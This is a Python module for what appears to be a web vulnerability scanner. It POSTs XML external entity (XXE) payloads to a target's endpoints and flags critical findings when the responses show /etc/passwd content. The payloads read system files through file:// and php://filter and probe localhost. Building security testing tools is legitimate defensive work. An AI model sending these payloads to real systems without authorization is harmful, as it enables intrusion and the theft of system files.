from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity

XXE_PAYLOADS = [
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root>&xxe;</root>',
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>',
]

XXE_DETECT_PATTERNS = ["root:", "bin/bash", "/bin/sh", "nobody:", "daemon:"]


@register_scanner(manifest=ScannerManifest(
    name="xxe_scanner",
    category="exploit",
    risk_level="aggressive",
    estimated_cost=40,
    produces_tag_patterns=["xxe", "xml-injection", "oob-xxe"],
    produces_endpoint_types=[],
))
class XxeScanner(BaseScanner):
    name = "xxe_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        client = await self.get_client()

        if not target.url.endswith((".xml", ".svg", ".wsdl")):
            xml_endpoints = [
                f"{target.url.rstrip('/')}/api",
                f"{target.url.rstrip('/')}/api/v1",
                target.url,
            ]
        else:
            xml_endpoints = [target.url]

        for url in xml_endpoints:
            for payload in XXE_PAYLOADS:
                try:
                    resp = await client.request(
                        "POST", url,
                        content=payload,
                        headers={"Content-Type": "application/xml"},
                        follow_redirects=False,
                    )
                    self._stats["requests"] += 1
                    body = resp.text or ""
                    if any(p in body for p in XXE_DETECT_PATTERNS):
                        ep = self.make_endpoint(url=url, status_code=resp.status_code, discovered_by=self.name)
                        endpoints.append(ep)
                        findings.append(self.make_finding(
                            title="XXE — File Read via XML External Entity",
                            description=f"Server at {url} processed an XML external entity and returned /etc/passwd content.",
                            severity=FindingSeverity.CRITICAL.value,
                            endpoint=ep,
                            evidence={"url": url, "payload": payload, "body_preview": body[:300]},
                            confidence=0.95,
                            tags=["xxe", "file-read"],
                        ))
                        break
                except Exception:
                    self._stats["errors"] += 1

        return findings, endpoints
